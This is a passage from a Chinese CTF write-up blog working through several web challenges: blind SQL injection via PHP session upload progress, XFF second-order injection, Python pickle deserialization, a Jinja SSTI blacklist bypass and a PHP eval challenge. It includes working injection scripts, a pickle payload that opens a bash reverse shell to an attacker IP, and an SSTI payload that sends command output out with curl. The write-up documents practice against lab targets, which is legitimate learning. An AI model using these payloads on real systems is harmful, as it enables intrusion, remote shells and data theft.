class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/login.php&#x27;</span>);</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]) <span class="keyword">AND</span> <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>] === <span class="string">&quot;home&quot;</span> <span class="keyword">AND</span> @<span class="keyword">include</span>(<span class="string">&#x27;templates/home.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于这里的addslashes转义，可以通过GBK编码绕过，接下去看login和register</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`=&quot;&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot; and password=&quot;&#x27;</span> . md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc() <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> auth(<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=?p=home&quot; /&gt;&#x27;</span>)) <span class="keyword">OR</span> (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果不存在SESSION就会die掉</span></span><br><span class="line"><span class="comment">//可以发现username为注入点，password因为有md5加密，所以构不成注入。fuzz时还发现过滤了  // ‘ 根据语句，可以使用\逃逸引号，并用#闭合构造查询语句</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//register.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>) <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Direct access on this script is not allowed!&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;db.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">(preg_match(<span class="string">&#x27;/(a|d|m|i|n)/&#x27;</span>, strtolower(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="keyword">OR</span> strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &lt; <span class="number">6</span> <span class="keyword">OR</span> strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &gt; <span class="number">10</span> <span class="keyword">OR</span> !ctype_alnum(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Not allowed!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES (&quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;&quot;,&quot;&#x27;</span> . md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) . <span class="string">&#x27;&quot;)&#x27;</span>;</span><br><span class="line">(<span class="variable">$con</span>-&gt;query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span> <span class="keyword">AND</span> <span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;The user was created successfully!&quot;</span>)) <span class="keyword">OR</span> (<span class="variable">$con</span>-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;Error!&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> <span class="comment">//要求注册只能为admin</span></span><br></pre></td></tr></table></figure>
<p>php.ini中有一些关于session的配置：<br>**在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()**，看一下官方文档</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu64.jpg"></p>
<p>比如说，我们可以通过如下脚本生成session文件<code>sess_test1</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1/test/1.php&#x27;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="number">123</span>&#125;</span><br><span class="line">re=requests.post(url,files=files,data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://fbafea7b-8e0f-4924-9ec3-4b0046577031.node3.buuoj.cn/templates/login.php&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">               payload_flag = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;test\&quot; or (ascii(substr((select group_concat(secret) from flag_tbl ),&#123;0&#125;,1))&gt;&#123;1&#125;) #&quot;</span>.<span class="built_in">format</span>(i,mid),<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;test&#x27;</span>&#125;</span><br><span class="line">        r = requests.post(url=url,params=payload_flag,files=files, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;123456789&quot;</span>&#125;,</span><br><span class="line">                  cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;test1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload_flag)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;again&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>


<h2 id="RoarCTF-2019-Online-Proxy-1"><a href="#RoarCTF-2019-Online-Proxy-1" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>知识点：XFF二次注入</p>
<p>wp网上很多师傅们都写得很详细了，再写主要是记录下赵师傅则是将字符转为数字直接输出的骚操作，效率高得多，贴出来学习一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://node3.buuoj.cn:25488/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span>(<span class="params">sql</span>):</span></span><br><span class="line">    print(<span class="string">&quot;[*]请求语句：&quot;</span> + sql)</span><br><span class="line">    return_result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;0&#x27;|length((&quot;</span> + sql + <span class="string">&quot;))|&#x27;0&quot;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    session = requests.session()</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">    r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">    start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">    end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">    length = <span class="built_in">int</span>(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">    print(<span class="string">&quot;[+]长度：&quot;</span> + <span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&quot;0&#x27;|conv(hex(substr((&quot;</span> + sql + <span class="string">&quot;),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,5)),16,10)|&#x27;0&quot;</span></span><br><span class="line">        print(payload)</span><br><span class="line"></span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: payload&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">        r = session.get(target, headers=&#123;<span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;glzjin&#x27;</span>&#125;)</span><br><span class="line">        start_pos = r.text.find(<span class="string">&quot;Last Ip: &quot;</span>)</span><br><span class="line">        end_pos = r.text.find(<span class="string">&quot; --&gt;&quot;</span>, start_pos)</span><br><span class="line">        result = <span class="built_in">int</span>(r.text[start_pos + <span class="number">9</span>: end_pos])</span><br><span class="line">        print(result)</span><br><span class="line">        return_result += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[+]位置 &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; 请求五位成功:&quot;</span> + <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(result)[<span class="number">2</span>:]).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> return_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 获取数据库</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA&quot;))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 获取数据库表</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27;&quot;))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 获取数据库表</span></span><br><span class="line"><span class="comment"># print(&quot;[+]获取成功：&quot; + execute_sql(&quot;SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = &#x27;F4l9_D4t4B45e&#x27; AND TABLE_NAME = &#x27;F4l9_t4b1e&#x27; &quot;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表中内容</span></span><br><span class="line">print(<span class="string">&quot;[+]获取成功：&quot;</span> + execute_sql(<span class="string">&quot;SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>由于BUU 429的原因，<code>  for i in range(50, length + 1, 5):</code>这里范围可以修改下，脚本多跑几次可以得出flag</p>
<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>知识点：python反序列化  <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7320">https://xz.aliyun.com/t/7320</a></p>
<p>看到题目名字，第一反应就是python反序列化</p>
<p>进入环境，买黄瓜，对于这种购物类的web题，切入点一般在<code>cookie</code>，买黄瓜，抓包，cookie尝试base64解密。</p>
<p>虽然有乱码，但是发现还是挺像点什么的。再结合题目中的“Pickle”，联想到Python反序列化。这cookie可能就是先经过Pickle序列化然后再进行base64加密的数据。</p>
<p>我们编写如下脚本，将原始的cookie数据给反序列胡出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">result = pickle.loads(base64.b64decode(<span class="string">b&#x27;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&#x27;</span>))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line">&#123;&#x27;money&#x27;: <span class="number">500</span>, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de<span class="number">5504</span>8cf20e0a7a63b7f8eb62&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>确实是我们所猜测的。</p>
<p>那我们便可以将我们pickle反序列话的payload进行base64加密，然后放入到cookie中，当服务器再获取我们cookie并进行反序列化时，便会触发payload。</p>
<p>编写如下POC进行反弹shell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xx.xx/2333 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,))</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p>得到伪造的cookie，将其设置为cookie的值，并且在本地开启监听，然后点击Buy：</p>
<p><img src="http://img.npfs06.top/20210224221309.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>知识点：</p>
<ol>
<li>SSTI</li>
<li>黑名单过滤逻辑错误</li>
</ol>
<blockquote>
<p>很详细的SSTI&gt;&gt;：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-4">https://xz.aliyun.com/t/6885#toc-4</a></p>
</blockquote>
<blockquote>
<p>SSTIbypass姿势&gt;&gt;<a target="_blank" rel="noopener" href="https://p0sec.net/index.php/archives/120/">https://p0sec.net/index.php/archives/120/</a></p>
</blockquote>
<p>打开题目，只有一个输入框，尝试输入<code>&#123;&#123;7*7&#125;&#125;</code>，不管怎么改，返回的结果都是一样的，说明可能<code>&#123;&#123;&#125;&#125;`被过滤了；过滤的字符串给了个PHP的报错，还给了一个不存在的文件，又把路由设置了一个`index.php`

**模板规则**

> `&#123;&#123;...&#125;&#125;</code>装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。</p>
<blockquote>
<p><code>&#123;% ... %&#125;</code>：装载一个控制语句。<br><code>&#123;# ... #&#125;</code>：装载一个注释，模板渲染的时候会忽视这中间的值。</p>
</blockquote>
<p><strong>但是可以通过 <code>&#123;%%&#125;</code> 类似的方式来进行注入，尝试 <code>&#123;%if 1%&#125;1&#123;% endif%&#125;</code></strong> ，发现服务器直接给出500错误。。。判断可能有什么过滤</p>
<p>直接输入if，返回结果是：</p>
<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello ! </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
<p>说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。</p>
<p>参考了师傅写的wp，fuzz出来的过滤可能是这个样子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27; subprocess&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, </span><br><span class="line">                 <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;config&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure>
<p>考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 <code>if=&gt;iconfigf</code> ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 <code>config</code> 被替换之后，过滤也就结束了。</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> &#x27;&#x27;.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__mro__</span>[</span></span><span class="number">2</span>];.<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">59</span>]</span>;.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span></span>func_globals.linecache.os.popen(&#x27;curl http:<span class="comment">//yourip:port/ -d ls / | grep flag;&#x27;) %&#125;1&#123;% endif %&#125;</span></span><br><span class="line">#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nc监听即可</p>
<h2 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h2><p>知识点：PHP7.4特性FFI</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
<p>尝试利用eval</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=echo system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>报错，system()函数被禁止了</p>
<p>尝试查看phpinfo();</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看成功,</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">收集一波phpinfo的信息</span><br><span class="line"></span><br><span class="line">disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br><span class="line"></span><br><span class="line">open_basedir	<span class="regexp">/var/</span>www/html</span><br><span class="line"></span><br><span class="line">opcache.preload	<span class="regexp">/var/</span>www<span class="regexp">/html/</span>preload.php</span><br><span class="line"></span><br><span class="line">FFI</span><br><span class="line">FFI support	enabled</span><br><span class="line">disable_classes	ReflectionClass	ReflectionClass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>接下来使用其中没有过滤的函数进行渗透:</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=echo var<span class="constructor">_dump(<span class="params">scandir</span>(<span class="string">&quot;/var/www/html/&quot;</span>)</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>返回结果如下:</p>
